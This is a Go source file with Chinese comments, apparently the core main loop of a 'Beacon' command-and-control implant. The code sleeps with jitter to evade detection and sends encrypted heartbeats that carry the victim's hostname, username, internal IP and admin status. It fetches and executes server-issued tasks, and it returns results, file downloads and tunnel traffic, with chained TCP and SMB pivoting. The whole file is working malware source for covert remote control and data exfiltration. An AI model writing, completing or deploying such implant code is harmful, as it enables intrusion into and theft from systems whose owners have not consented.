// Package core 实现 Beacon 的主循环和生命周期管理。
package core

import (
	"beacon/pkg/command"
	"beacon/pkg/profile"
	"beacon/pkg/utils/crypt"
	httptransport "beacon/pkg/utils/http"
	"beacon/pkg/utils/packet"
	"fmt"
	"strings"
	"sync/atomic"
	"time"
)

// Agent 是 Beacon 的核心运行实体，持有上下文、传输层客户端和命令处理器。
// 主循环以心跳驱动：发送心跳 → 接收任务 → 执行 → 回传结果。
type Agent struct {
	Ctx     *Context
	client  Transport
	handler *command.Handler
	stop    atomic.Bool
}

// NewAgent 创建并初始化一个 Agent 实例。
// 内部会加载配置、收集系统信息、生成随机 BeaconID 和会话密钥。
func NewAgent() (*Agent, error) {
	ctx, err := NewContext()
	if err != nil {
		return nil, err
	}

	handler := command.NewHandler(ctx.Meta.ACP)
	handler.SetID(ctx.BeaconID, ctx.SessionKey)

	agent := &Agent{
		Ctx:     ctx,
		client:  httptransport.NewHttpClient(),
		handler: handler,
	}
	handler.SetResultSink(func(pkt []byte) {
		agent.Ctx.Outbox.Enqueue(pkt)
	})
	return agent, nil
}

// Close 释放 Agent 持有的所有资源（命令处理器、上下文、会话密钥）。
func (a *Agent) Close() {
	if a == nil {
		return
	}
	if a.handler != nil {
		a.handler.Close()
	}
	if a.Ctx != nil {
		a.Ctx.Close()
	}
}

// Stop 请求 Agent 主循环在当前心跳周期结束后退出。
func (a *Agent) Stop() {
	if a != nil {
		a.stop.Store(true)
	}
}

// Run 启动 Beacon 主循环，返回退出码（0=正常退出，-1=初始化失败）。
// 主循环流程：sleep → 构建心跳 → 加密 → 发送 → 分派任务 → 回传结果。
func (a *Agent) Run() int {
	if a == nil || a.Ctx == nil {
		return -1
	}

	if isInternalProfile() {
		switch strings.ToLower(profile.GlobalProfile.Protocol) {
		case "tcp":
			return a.runInternalTCP()
		case "smb":
			return a.runInternalSMB()
		default:
			return -1
		}
	}

	return a.runExternal()
}

func isInternalProfile() bool {
	return strings.EqualFold(profile.GlobalProfile.ListenerType, "internal")
}

func (a *Agent) runExternal() int {
	for a.Ctx.Active() && !a.stop.Load() {
		// 1. 按配置的 sleep + jitter 等待
		a.sleep()

		// 2. 构建心跳明文并加密
		plain, err := a.buildHeartbeatPlain()
		if err != nil {
			continue
		}

		heartbeat, err := crypt.EncryptHeartbeat(profile.GlobalProfile.HTTP.EncryptKey, plain)
		if err != nil {
			continue
		}

		// 3. 发送心跳，获取服务端返回的加密任务
		response, err := a.client.Exchange(heartbeat, nil)
		if err != nil {
			continue
		}

		// 4. 解密并执行任务，结果写入 Outbox
		a.dispatchTasks(response)

		// 5. 同 tick 收割隧道（短暂等待 worker 入队后排空），并排空传输/级联队列
		a.flushTransfers()
		a.harvestTunnels()
		a.flushCascade()

		// 6. 批量回传 Outbox 中的结果（一次加密、一次发送；失败整批回塞）
		a.flushOutbox(heartbeat)
	}

	return 0
}

// sleep 按配置的 SleepTime 和 Jitter 百分比执行带抖动的等待。
func (a *Agent) sleep() {
	sleepFor := profile.GlobalProfile.SleepTime
	if sleepFor <= 0 {
		return
	}

	jitter := profile.GlobalProfile.Jitter
	if jitter < 0 {
		jitter = 0
	}
	if jitter > 100 {
		jitter = 100
	}
	if jitter > 0 {
		r := int(randomU32() % uint32(jitter+1))
		sleepFor += time.Duration((int64(r) * int64(sleepFor)) / 100)
	}

	time.Sleep(sleepFor)
}

// buildHeartbeatPlain 组装心跳明文：BeaconID + SessionKey + 系统元数据。
func (a *Agent) buildHeartbeatPlain() ([]byte, error) {
	meta := a.Ctx.Meta
	metaBytes, err := packet.PackArray([]any{
		meta.OS,
		meta.Arch,
		meta.Hostname,
		meta.Username,
		meta.InternalIP,
		meta.ProcessName,
		uint32(meta.PID),
		meta.IsAdmin,
		uint32(meta.ACP),
		uint32(profile.GlobalProfile.SleepTime / time.Second),
		uint32(profile.GlobalProfile.Jitter),
	})
	if err != nil {
		return nil, err
	}
	return packet.PackHeartbeat(a.Ctx.BeaconID, a.Ctx.SessionKey, metaBytes)
}

// dispatchTasks 解密服务端返回的任务包，逐条解析并分派给对应的命令处理器。
// 每条任务格式：[taskID int32][commandID int32][payload bytes]。
func (a *Agent) dispatchTasks(encryptedTasks []byte) {
	if len(encryptedTasks) == 0 || string(encryptedTasks) == "404 page not found" {
		return
	}

	// 用会话密钥解密任务
	plain, err := crypt.DecryptTask(a.Ctx.SessionKey, encryptedTasks)
	if err != nil {
		return
	}

	// 外层循环：每个元素是一条完整的任务块
	outer := packet.CreateParser(plain)
	for outer.Size() > 0 {
		taskBlock := outer.ParseBytes()
		if outer.HasError() {
			break
		}

		taskParser := packet.CreateParser(taskBlock)
		taskID := taskParser.ParseInt32()
		commandID := taskParser.ParseInt32()
		payload := taskParser.ParseBytes()
		if taskParser.HasError() {
			a.enqueueFinal(taskID, commandID, []byte(taskParser.Error().Error()))
			continue
		}

		results, err := a.handler.Handle(taskID, commandID, payload)
		if err != nil {
			a.enqueueFinal(taskID, commandID, []byte(fmt.Sprintf("error: %v", err)))
			continue
		}

		for _, result := range results {
			if isFinalResult(commandID) {
				a.Ctx.Outbox.Enqueue(result)
			} else {
				a.enqueueFinal(taskID, commandID, result)
			}
		}

		if commandID == command.CommandExit {
			// 退出前同步关闭所有级联子链路并入队 CascadeDead，
			// 确保当前轮次的 flushCascade + flushOutbox 能把 Dead 通知发给服务端，
			// 避免服务端路由表残留旧的父 beacon session，导致新父 beacon 接管后命令无效。
			a.handler.ShutdownCascade()
			a.Ctx.Stop()
		}
	}
}

// enqueueFinal 将结果包装为最终响应包并入队 Outbox。
func (a *Agent) enqueueFinal(taskID uint32, commandID uint32, payload []byte) {
	a.Ctx.Outbox.Enqueue(packet.MakeFinalPacket(taskID, commandID, payload))
}

// isFinalResult 判断该命令的结果是否已经是最终包（如 Download 的分块数据），
// 若是则直接入队，不再用 MakeFinalPacket 包装。
func isFinalResult(commandID uint32) bool {
	return commandID == command.CommandDownload
}

// flushTransfers 将文件传输的挂起数据包移入 Outbox。
func (a *Agent) flushTransfers() {
	for _, pkt := range a.handler.GetPendingDownloadPackets() {
		a.Ctx.Outbox.Enqueue(pkt)
	}
}

// flushTunnels 将隧道转发的挂起数据包移入 Outbox。
func (a *Agent) flushTunnels() {
	for _, pkt := range a.handler.GetPendingTunnelPackets() {
		a.Ctx.Outbox.Enqueue(pkt)
	}
}

// harvestTunnels 同 tick 收割：短暂等待 worker 入队后再排空，
// 避免响应落到下一轮 sleep（对齐 C 版 AgentHarvestTunnels）。
func (a *Agent) harvestTunnels() {
	a.handler.HarvestTunnels()
	a.flushTunnels()
}

func (a *Agent) flushCascade() {
	for _, pkt := range a.handler.GetPendingCascadePackets() {
		a.Ctx.Outbox.Enqueue(pkt)
	}
}

// flushOutbox 批量回传 Outbox 中的结果包（对齐 C 版 AgentFlushOutbox 批量版）：
// drain → 拼接所有包为一个明文 buffer → 一次加密 → 一次发送 →
// 成功后分派响应任务并补排空隧道（不等待，不新开 C2 往返）。
// 失败语义：拼接/加密/发送任一步失败，整批回塞队列头部，下个 tick 重试，不丢包。
func (a *Agent) flushOutbox(heartbeat []byte) {
	list := a.Ctx.Outbox.Drain()
	if list == nil {
		return
	}

	// 1. 把所有 outbox 包拼接成一个明文 buffer（多个 MakeFinalPacket 长度前缀块顺序拼接）
	plain := make([]byte, 0, 4096)
	for cur := list; cur != nil; cur = cur.next {
		plain = append(plain, cur.packet...)
	}

	// 2. 一次加密所有包
	encrypted, err := crypt.EncryptResult(a.Ctx.SessionKey, plain)
	if err != nil {
		a.Ctx.Outbox.PushFrontList(list)
		return
	}

	// 3. 一次发送
	response, err := a.client.Exchange(heartbeat, encrypted)
	if err != nil {
		a.Ctx.Outbox.PushFrontList(list)
		return
	}

	// 4. 发送成功：节点丢弃（Go 无需显式释放）

	// 5. 分派响应里的任务（一次），再补排空隧道（不等待）
	a.dispatchTasks(response)
	a.flushTunnels()
}
